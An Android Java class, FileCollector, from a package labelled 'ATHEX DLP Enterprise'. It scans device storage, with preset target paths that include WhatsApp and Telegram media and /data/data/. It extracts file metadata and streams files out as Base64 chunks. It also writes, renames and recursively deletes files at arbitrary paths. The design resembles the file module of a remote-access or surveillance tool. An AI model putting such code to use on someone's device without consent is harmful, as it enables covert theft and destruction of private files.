package com.athex.dlp.collectors;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.StatFs;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * ATHEX DLP Enterprise - FileCollector
 * 
 * Advanced file system exploration and management module.
 * Provides complete file system operations:
 * - Directory listing with recursive scanning
 * - File metadata extraction (size, dates, permissions)
 * - File search with filters
 * - File download in chunks
 * - File upload support
 * - File deletion (single and recursive)
 * - Storage information
 * - Hidden file detection
 * - File type categorization
 * 
 * @author ATHEX DLP Team
 * @version 2.0.0
 */
public class FileCollector {
    
    private static final String TAG = "ATHEX_FileCollector";
    
    // Buffer size for file transfers
    private static final int BUFFER_SIZE = 65536; // 64KB
    private static final int MAX_RECURSION_DEPTH = 10;
    private static final int MAX_FILES_PER_DIR = 1000;
    
    // Common directories
    public static final String[] COMMON_PATHS = {
        "/sdcard/",
        "/sdcard/DCIM/",
        "/sdcard/DCIM/Camera/",
        "/sdcard/Download/",
        "/sdcard/Documents/",
        "/sdcard/Pictures/",
        "/sdcard/Music/",
        "/sdcard/Movies/",
        "/sdcard/WhatsApp/",
        "/sdcard/WhatsApp/Media/",
        "/sdcard/WhatsApp/Media/WhatsApp Images/",
        "/sdcard/WhatsApp/Media/WhatsApp Video/",
        "/sdcard/WhatsApp/Media/WhatsApp Documents/",
        "/sdcard/WhatsApp/Media/WhatsApp Audio/",
        "/sdcard/Telegram/",
        "/sdcard/Android/data/",
        "/sdcard/Android/obb/",
        "/system/",
        "/data/data/",
    };
    
    // File type categories
    public static final String CATEGORY_IMAGE = "image";
    public static final String CATEGORY_VIDEO = "video";
    public static final String CATEGORY_AUDIO = "audio";
    public static final String CATEGORY_DOCUMENT = "document";
    public static final String CATEGORY_ARCHIVE = "archive";
    public static final String CATEGORY_APK = "apk";
    public static final String CATEGORY_DATABASE = "database";
    public static final String CATEGORY_OTHER = "other";
    
    // ============================================================
    // INSTANCE VARIABLES
    // ============================================================
    
    private final Context context;
    private final ExecutorService executor;
    private final Handler mainHandler;
    private final AtomicBoolean isCancelled = new AtomicBoolean(false);
    
    // Options
    private int maxRecursionDepth = MAX_RECURSION_DEPTH;
    private int maxFilesPerDir = MAX_FILES_PER_DIR;
    private boolean includeHidden = true;
    private boolean includeSystemFiles = false;
    private boolean calculateChecksums = false;
    private String fileTypeFilter = null; // Filter by category
    private String extensionFilter = null; // Filter by extension
    private long minSizeFilter = 0;
    private long maxSizeFilter = Long.MAX_VALUE;
    
    // Statistics
    private int totalFiles = 0;
    private int totalDirectories = 0;
    private long totalSize = 0;
    private long collectionStartTime = 0;
    
    // Callbacks
    private CollectionCallback callback;
    private TransferCallback transferCallback;
    
    // ============================================================
    // INTERFACES
    // ============================================================
    
    public interface CollectionCallback {
        void onCollectionStarted(String path);
        void onProgressUpdate(String currentPath, int filesFound, int dirsFound);
        void onCollectionComplete(JSONObject result, FileStats stats);
        void onCollectionError(String error);
    }
    
    public interface TransferCallback {
        void onTransferStarted(String fileName, long totalBytes);
        void onProgressUpdate(long bytesTransferred, int percentComplete);
        void onTransferComplete(String fileName);
        void onTransferError(String error);
    }
    
    public static class FileStats {
        public int totalFiles;
        public int totalDirectories;
        public long totalSizeBytes;
        public long durationMs;
        public String rootPath;
        
        @Override
        public String toString() {
            return String.format(Locale.getDefault(),
                "Files: %d | Dirs: %d | Size: %s | Duration: %dms",
                totalFiles, totalDirectories, formatSize(totalSizeBytes), durationMs
            );
        }
    }
    
    // ============================================================
    // CONSTRUCTOR
    // ============================================================
    
    public FileCollector(Context context) {
        this.context = context.getApplicationContext();
        this.executor = Executors.newFixedThreadPool(2);
        this.mainHandler = new Handler(Looper.getMainLooper());
    }
    
    // ============================================================
    // CONFIGURATION
    // ============================================================
    
    public FileCollector setMaxRecursionDepth(int depth) {
        this.maxRecursionDepth = Math.min(depth, MAX_RECURSION_DEPTH);
        return this;
    }
    
    public FileCollector setIncludeHidden(boolean include) {
        this.includeHidden = include;
        return this;
    }
    
    public FileCollector setIncludeSystemFiles(boolean include) {
        this.includeSystemFiles = include;
        return this;
    }
    
    public FileCollector setFileTypeFilter(String category) {
        this.fileTypeFilter = category;
        return this;
    }
    
    public FileCollector setExtensionFilter(String extension) {
        this.extensionFilter = extension != null ? extension.toLowerCase() : null;
        return this;
    }
    
    public FileCollector setSizeFilter(long minSize, long maxSize) {
        this.minSizeFilter = minSize;
        this.maxSizeFilter = maxSize;
        return this;
    }
    
    public FileCollector setCallback(CollectionCallback callback) {
        this.callback = callback;
        return this;
    }
    
    public FileCollector setTransferCallback(TransferCallback callback) {
        this.transferCallback = callback;
        return this;
    }
    
    // ============================================================
    // DIRECTORY LISTING
    // ============================================================
    
    /**
     * List directory contents
     */
    public void listDirectory(String path) {
        executor.execute(() -> {
            try {
                collectionStartTime = System.currentTimeMillis();
                isCancelled.set(false);
                resetStats();
                
                notifyCollectionStarted(path);
                
                File directory = new File(path);
                
                if (!directory.exists()) {
                    notifyError("Directory does not exist: " + path);
                    return;
                }
                
                if (!directory.isDirectory()) {
                    notifyError("Path is not a directory: " + path);
                    return;
                }
                
                if (!directory.canRead()) {
                    notifyError("Cannot read directory: " + path);
                    return;
                }
                
                JSONObject result = scanDirectory(directory, 0);
                
                FileStats stats = buildStats(path);
                stats.durationMs = System.currentTimeMillis() - collectionStartTime;
                
                Log.i(TAG, "Directory scan complete: " + stats.toString());
                notifyCollectionComplete(result, stats);
                
            } catch (SecurityException e) {
                Log.e(TAG, "Permission denied: " + e.getMessage());
                notifyError("Permission denied. Storage permissions required.");
            } catch (Exception e) {
                Log.e(TAG, "Directory scan error: " + e.getMessage(), e);
                notifyError("Scan failed: " + e.getMessage());
            }
        });
    }
    
    /**
     * Recursively scan directory
     */
    private JSONObject scanDirectory(File directory, int depth) {
        JSONObject dirInfo = new JSONObject();
        
        try {
            dirInfo.put("name", directory.getName());
            dirInfo.put("path", directory.getAbsolutePath());
            dirInfo.put("type", "directory");
            dirInfo.put("depth", depth);
            dirInfo.put("last_modified", directory.lastModified());
            dirInfo.put("last_modified_formatted", formatTimestamp(directory.lastModified()));
            dirInfo.put("readable", directory.canRead());
            dirInfo.put("writable", directory.canWrite());
            dirInfo.put("executable", directory.canExecute());
            dirInfo.put("is_hidden", directory.isHidden());
            
            // Get parent info
            File parent = directory.getParentFile();
            if (parent != null) {
                dirInfo.put("parent_path", parent.getAbsolutePath());
            }
            
            // List contents
            File[] files = directory.listFiles();
            
            if (files == null) {
                dirInfo.put("error", "Cannot list files (permission denied or IO error)");
                dirInfo.put("files", new JSONArray());
                return dirInfo;
            }
            
            // Sort files: directories first, then by name
            List<File> fileList = Arrays.asList(files);
            Collections.sort(fileList, (a, b) -> {
                if (a.isDirectory() && !b.isDirectory()) return -1;
                if (!a.isDirectory() && b.isDirectory()) return 1;
                return a.getName().compareToIgnoreCase(b.getName());
            });
            
            // Limit files per directory
            int limit = Math.min(fileList.size(), maxFilesPerDir);
            if (fileList.size() > maxFilesPerDir) {
                dirInfo.put("truncated", true);
                dirInfo.put("total_files", fileList.size());
                dirInfo.put("shown_files", limit);
            }
            
            JSONArray filesArray = new JSONArray();
            JSONArray dirsArray = new JSONArray();
            
            int fileCount = 0;
            int dirCount = 0;
            
            for (int i = 0; i < limit; i++) {
                if (isCancelled.get()) break;
                
                File file = fileList.get(i);
                
                // Skip hidden files if not included
                if (!includeHidden && file.isHidden()) {
                    continue;
                }
                
                // Skip system files
                if (!includeSystemFiles && isSystemFile(file)) {
                    continue;
                }
                
                if (file.isDirectory()) {
                    totalDirectories++;
                    dirCount++;
                    
                    JSONObject subDir;
                    
                    // Recurse into subdirectories if within depth limit
                    if (depth < maxRecursionDepth) {
                        subDir = scanDirectory(file, depth + 1);
                    } else {
                        subDir = new JSONObject();
                        subDir.put("name", file.getName());
                        subDir.put("path", file.getAbsolutePath());
                        subDir.put("type", "directory");
                        subDir.put("truncated", true);
                        subDir.put("files", new JSONArray());
                    }
                    
                    dirsArray.put(subDir);
                    
                } else {
                    totalFiles++;
                    fileCount++;
                    totalSize += file.length();
                    
                    JSONObject fileInfo = extractFileInfo(file, depth);
                    
                    // Apply filters
                    if (passesFilters(fileInfo)) {
                        filesArray.put(fileInfo);
                    }
                }
                
                // Progress update
                if ((fileCount + dirCount) % 50 == 0) {
                    notifyProgress(directory.getAbsolutePath(), totalFiles, totalDirectories);
                }
            }
            
            dirInfo.put("file_count", fileCount);
            dirInfo.put("directory_count", dirCount);
            dirInfo.put("total_size", getDirectorySize(directory));
            dirInfo.put("total_size_formatted", formatSize(getDirectorySize(directory)));
            dirInfo.put("files", filesArray);
            dirInfo.put("directories", dirsArray);
            
        } catch (Exception e) {
            Log.e(TAG, "Error scanning directory: " + e.getMessage());
            try {
                dirInfo.put("error", e.getMessage());
            } catch (Exception ex) {
                Log.e(TAG, "Error adding error info: " + ex.getMessage());
            }
        }
        
        return dirInfo;
    }
    
    /**
     * Extract file metadata
     */
    private JSONObject extractFileInfo(File file, int depth) {
        JSONObject fileInfo = new JSONObject();
        
        try {
            fileInfo.put("name", file.getName());
            fileInfo.put("path", file.getAbsolutePath());
            fileInfo.put("type", "file");
            fileInfo.put("size", file.length());
            fileInfo.put("size_formatted", formatSize(file.length()));
            fileInfo.put("last_modified", file.lastModified());
            fileInfo.put("last_modified_formatted", formatTimestamp(file.lastModified()));
            fileInfo.put("depth", depth);
            fileInfo.put("readable", file.canRead());
            fileInfo.put("writable", file.canWrite());
            fileInfo.put("executable", file.canExecute());
            fileInfo.put("is_hidden", file.isHidden());
            
            // Extension
            String name = file.getName();
            int dotIndex = name.lastIndexOf('.');
            if (dotIndex > 0) {
                String extension = name.substring(dotIndex + 1).toLowerCase();
                fileInfo.put("extension", extension);
                fileInfo.put("category", getFileCategory(extension));
            } else {
                fileInfo.put("extension", "");
                fileInfo.put("category", CATEGORY_OTHER);
            }
            
            // MIME type (basic detection)
            fileInfo.put("mime_type", getMimeType(name));
            
            // Parent directory
            File parent = file.getParentFile();
            if (parent != null) {
                fileInfo.put("parent_path", parent.getAbsolutePath());
            }
            
            // Checksum (optional - CPU intensive)
            if (calculateChecksums && file.length() < 10 * 1024 * 1024) { // Only for files < 10MB
                fileInfo.put("md5", calculateMD5(file));
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting file info: " + e.getMessage());
            try {
                fileInfo.put("error", e.getMessage());
            } catch (Exception ex) {
                Log.e(TAG, "Error adding error info: " + ex.getMessage());
            }
        }
        
        return fileInfo;
    }
    
    // ============================================================
    // FILE TRANSFER
    // ============================================================
    
    /**
     * Read file and return as Base64 string (for small files)
     */
    public String readFileAsBase64(String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists() || file.length() > 5 * 1024 * 1024) { // 5MB limit
                return null;
            }
            
            byte[] bytes = new byte[(int) file.length()];
            FileInputStream fis = new FileInputStream(file);
            fis.read(bytes);
            fis.close();
            
            return android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP);
            
        } catch (Exception e) {
            Log.e(TAG, "Error reading file: " + e.getMessage());
            return null;
        }
    }
    
    /**
     * Download file in chunks (for large files)
     */
    public void downloadFileInChunks(String filePath, ChunkDownloadCallback chunkCallback) {
        executor.execute(() -> {
            try {
                File file = new File(filePath);
                
                if (!file.exists()) {
                    notifyTransferError("File not found: " + filePath);
                    return;
                }
                
                long fileSize = file.length();
                notifyTransferStarted(file.getName(), fileSize);
                
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[BUFFER_SIZE];
                int bytesRead;
                long totalRead = 0;
                int chunkIndex = 0;
                
                while ((bytesRead = fis.read(buffer)) != -1) {
                    byte[] chunk = new byte[bytesRead];
                    System.arraycopy(buffer, 0, chunk, 0, bytesRead);
                    
                    String encodedChunk = android.util.Base64.encodeToString(
                        chunk, android.util.Base64.NO_WRAP
                    );
                    
                    if (chunkCallback != null) {
                        chunkCallback.onChunkReady(chunkIndex, encodedChunk, bytesRead);
                    }
                    
                    totalRead += bytesRead;
                    chunkIndex++;
                    
                    int percent = (int) ((totalRead * 100) / fileSize);
                    notifyTransferProgress(totalRead, percent);
                }
                
                fis.close();
                notifyTransferComplete(file.getName());
                
            } catch (Exception e) {
                Log.e(TAG, "Error downloading file: " + e.getMessage());
                notifyTransferError("Download failed: " + e.getMessage());
            }
        });
    }
    
    public interface ChunkDownloadCallback {
        void onChunkReady(int chunkIndex, String base64Data, int bytesRead);
    }
    
    /**
     * Upload file (write data to path)
     */
    public void uploadFile(String filePath, byte[] data) {
        executor.execute(() -> {
            try {
                File file = new File(filePath);
                
                // Create parent directories if needed
                File parent = file.getParentFile();
                if (parent != null && !parent.exists()) {
                    parent.mkdirs();
                }
                
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(data);
                fos.close();
                
                Log.i(TAG, "File uploaded: " + filePath + " (" + data.length + " bytes)");
                
            } catch (Exception e) {
                Log.e(TAG, "Error uploading file: " + e.getMessage());
            }
        });
    }
    
    // ============================================================
    // FILE OPERATIONS
    // ============================================================
    
    /**
     * Delete file or directory
     */
    public boolean deleteFile(String path) {
        try {
            File file = new File(path);
            
            if (!file.exists()) {
                Log.w(TAG, "File not found: " + path);
                return false;
            }
            
            if (file.isDirectory()) {
                return deleteDirectory(file);
            } else {
                return file.delete();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error deleting file: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Recursively delete directory
     */
    private boolean deleteDirectory(File directory) {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    deleteDirectory(file);
                } else {
                    file.delete();
                }
            }
        }
        return directory.delete();
    }
    
    /**
     * Rename/move file
     */
    public boolean renameFile(String sourcePath, String destPath) {
        try {
            File source = new File(sourcePath);
            File dest = new File(destPath);
            
            if (!source.exists()) {
                return false;
            }
            
            // Create parent directories if needed
            File parent = dest.getParentFile();
            if (parent != null && !parent.exists()) {
                parent.mkdirs();
            }
            
            return source.renameTo(dest);
            
        } catch (Exception e) {
            Log.e(TAG, "Error renaming file: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Create new directory
     */
    public boolean createDirectory(String path) {
        try {
            File dir = new File(path);
            return dir.mkdirs();
        } catch (Exception e) {
            Log.e(TAG, "Error creating directory: " + e.getMessage());
            return false;
        }
    }
    
    // ============================================================
    // STORAGE INFORMATION
    // ============================================================
    
    /**
     * Get storage information
     */
    public JSONObject getStorageInfo() {
        JSONObject storageInfo = new JSONObject();
        
        try {
            // Internal storage
            File internalStorage = Environment.getDataDirectory();
            StatFs internalStat = new StatFs(internalStorage.getAbsolutePath());
            
            long internalTotal = internalStat.getTotalBytes();
            long internalFree = internalStat.getAvailableBytes();
            long internalUsed = internalTotal - internalFree;
            
            JSONObject internal = new JSONObject();
            internal.put("path", internalStorage.getAbsolutePath());
            internal.put("total", internalTotal);
            internal.put("total_formatted", formatSize(internalTotal));
            internal.put("free", internalFree);
            internal.put("free_formatted", formatSize(internalFree));
            internal.put("used", internalUsed);
            internal.put("used_formatted", formatSize(internalUsed));
            internal.put("used_percent", Math.round((internalUsed * 100.0) / internalTotal));
            storageInfo.put("internal", internal);
            
            // External storage (SD card)
            if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
                File externalStorage = Environment.getExternalStorageDirectory();
                StatFs externalStat = new StatFs(externalStorage.getAbsolutePath());
                
                long externalTotal = externalStat.getTotalBytes();
                long externalFree = externalStat.getAvailableBytes();
                long externalUsed = externalTotal - externalFree;
                
                JSONObject external = new JSONObject();
                external.put("path", externalStorage.getAbsolutePath());
                external.put("total", externalTotal);
                external.put("total_formatted", formatSize(externalTotal));
                external.put("free", externalFree);
                external.put("free_formatted", formatSize(externalFree));
                external.put("used", externalUsed);
                external.put("used_formatted", formatSize(externalUsed));
                external.put("used_percent", Math.round((externalUsed * 100.0) / externalTotal));
                storageInfo.put("external", external);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting storage info: " + e.getMessage());
            try {
                storageInfo.put("error", e.getMessage());
            } catch (Exception ex) {
                Log.e(TAG, "Error adding error info: " + ex.getMessage());
            }
        }
        
        return storageInfo;
    }
    
    // ============================================================
    // FILE SEARCH
    // ============================================================
    
    /**
     * Search for files matching pattern
     */
    public void searchFiles(String rootPath, String searchPattern, CollectionCallback callback) {
        this.callback = callback;
        
        executor.execute(() -> {
            try {
                collectionStartTime = System.currentTimeMillis();
                resetStats();
                
                notifyCollectionStarted(rootPath);
                
                JSONObject result = new JSONObject();
                result.put("search_pattern", searchPattern);
                result.put("root_path", rootPath);
                
                JSONArray foundFiles = new JSONArray();
                searchRecursive(new File(rootPath), searchPattern.toLowerCase(), foundFiles, 0);
                
                result.put("results", foundFiles);
                result.put("total_found", foundFiles.length());
                
                FileStats stats = buildStats(rootPath);
                stats.durationMs = System.currentTimeMillis() - collectionStartTime;
                
                notifyCollectionComplete(result, stats);
                
            } catch (Exception e) {
                Log.e(TAG, "Error searching files: " + e.getMessage());
                notifyError("Search failed: " + e.getMessage());
            }
        });
    }
    
    /**
     * Recursive file search
     */
    private void searchRecursive(File directory, String pattern, JSONArray results, int depth) {
        if (isCancelled.get() || depth > maxRecursionDepth) return;
        
        File[] files = directory.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (isCancelled.get()) return;
            
            if (file.isDirectory()) {
                if (!includeHidden && file.isHidden()) continue;
                searchRecursive(file, pattern, results, depth + 1);
            } else {
                if (file.getName().toLowerCase().contains(pattern)) {
                    JSONObject fileInfo = extractFileInfo(file, depth);
                    results.put(fileInfo);
                    totalFiles++;
                    totalSize += file.length();
                }
            }
        }
    }
    
    // ============================================================
    // UTILITY METHODS
    // ============================================================
    
    private boolean isSystemFile(File file) {
        String name = file.getName();
        return name.startsWith(".") || name.equals("proc") || name.equals("sys");
    }
    
    private boolean passesFilters(JSONObject fileInfo) {
        try {
            // Category filter
            if (fileTypeFilter != null) {
                String category = fileInfo.optString("category", "");
                if (!category.equals(fileTypeFilter)) {
                    return false;
                }
            }
            
            // Extension filter
            if (extensionFilter != null) {
                String ext = fileInfo.optString("extension", "");
                if (!ext.equals(extensionFilter)) {
                    return false;
                }
            }
            
            // Size filter
            long size = fileInfo.optLong("size", 0);
            if (size < minSizeFilter || size > maxSizeFilter) {
                return false;
            }
            
            return true;
            
        } catch (Exception e) {
            return true; // Include if can't determine
        }
    }
    
    private String getFileCategory(String extension) {
        switch (extension) {
            case "jpg": case "jpeg": case "png": case "gif": case "bmp":
            case "webp": case "heic": case "svg":
                return CATEGORY_IMAGE;
                
            case "mp4": case "avi": case "mkv": case "mov": case "wmv":
            case "flv": case "3gp": case "webm":
                return CATEGORY_VIDEO;
                
            case "mp3": case "wav": case "aac": case "ogg": case "flac":
            case "m4a": case "wma":
                return CATEGORY_AUDIO;
                
            case "pdf": case "doc": case "docx": case "xls": case "xlsx":
            case "ppt": case "pptx": case "txt": case "csv":
                return CATEGORY_DOCUMENT;
                
            case "zip": case "rar": case "7z": case "tar": case "gz":
                return CATEGORY_ARCHIVE;
                
            case "apk": case "xapk":
                return CATEGORY_APK;
                
            case "db": case "sqlite": case "sqlite3":
                return CATEGORY_DATABASE;
                
            default:
                return CATEGORY_OTHER;
        }
    }
    
    private String getMimeType(String filename) {
        String ext = filename.substring(filename.lastIndexOf('.') + 1).toLowerCase();
        switch (ext) {
            case "jpg": case "jpeg": return "image/jpeg";
            case "png": return "image/png";
            case "gif": return "image/gif";
            case "mp4": return "video/mp4";
            case "mp3": return "audio/mpeg";
            case "pdf": return "application/pdf";
            case "apk": return "application/vnd.android.package-archive";
            case "txt": return "text/plain";
            case "html": return "text/html";
            case "json": return "application/json";
            case "zip": return "application/zip";
            default: return "application/octet-stream";
        }
    }
    
    private String calculateMD5(File file) {
        try {
            java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[8192];
            int read;
            while ((read = fis.read(buffer)) != -1) {
                md.update(buffer, 0, read);
            }
            fis.close();
            
            byte[] digest = md.digest();
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
            
        } catch (Exception e) {
            return null;
        }
    }
    
    private long getDirectorySize(File directory) {
        long size = 0;
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isFile()) {
                    size += file.length();
                } else {
                    size += getDirectorySize(file);
                }
            }
        }
        return size;
    }
    
    public static String formatSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        int exp = (int) (Math.log(bytes) / Math.log(1024));
        String pre = "KMGTPE".charAt(exp - 1) + "";
        return String.format(Locale.getDefault(), "%.1f %sB", bytes / Math.pow(1024, exp), pre);
    }
    
    private String formatTimestamp(long timestamp) {
        try {
            return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(new Date(timestamp));
        } catch (Exception e) {
            return String.valueOf(timestamp);
        }
    }
    
    private void resetStats() {
        totalFiles = 0;
        totalDirectories = 0;
        totalSize = 0;
    }
    
    private FileStats buildStats(String rootPath) {
        FileStats stats = new FileStats();
        stats.totalFiles = totalFiles;
        stats.totalDirectories = totalDirectories;
        stats.totalSizeBytes = totalSize;
        stats.rootPath = rootPath;
        return stats;
    }
    
    // ============================================================
    // CALLBACKS
    // ============================================================
    
    private void notifyCollectionStarted(String path) {
        if (callback != null) {
            mainHandler.post(() -> callback.onCollectionStarted(path));
        }
    }
    
    private void notifyProgress(String path, int files, int dirs) {
        if (callback != null) {
            mainHandler.post(() -> callback.onProgressUpdate(path, files, dirs));
        }
    }
    
    private void notifyCollectionComplete(JSONObject result, FileStats stats) {
        if (callback != null) {
            mainHandler.post(() -> callback.onCollectionComplete(result, stats));
        }
    }
    
    private void notifyError(String error) {
        if (callback != null) {
            mainHandler.post(() -> callback.onCollectionError(error));
        }
    }
    
    private void notifyTransferStarted(String fileName, long totalBytes) {
        if (transferCallback != null) {
            mainHandler.post(() -> transferCallback.onTransferStarted(fileName, totalBytes));
        }
    }
    
    private void notifyTransferProgress(long bytesTransferred, int percent) {
        if (transferCallback != null) {
            mainHandler.post(() -> transferCallback.onProgressUpdate(bytesTransferred, percent));
        }
    }
    
    private void notifyTransferComplete(String fileName) {
        if (transferCallback != null) {
            mainHandler.post(() -> transferCallback.onTransferComplete(fileName));
        }
    }
    
    private void notifyTransferError(String error) {
        if (transferCallback != null) {
            mainHandler.post(() -> transferCallback.onTransferError(error));
        }
    }
    
    /**
     * Cancel ongoing operation
     */
    public void cancel() {
        isCancelled.set(true);
    }
    
    public void shutdown() {
        isCancelled.set(true);
        if (executor != null && !executor.isShutdown()) {
            executor.shutdown();
        }
    }
}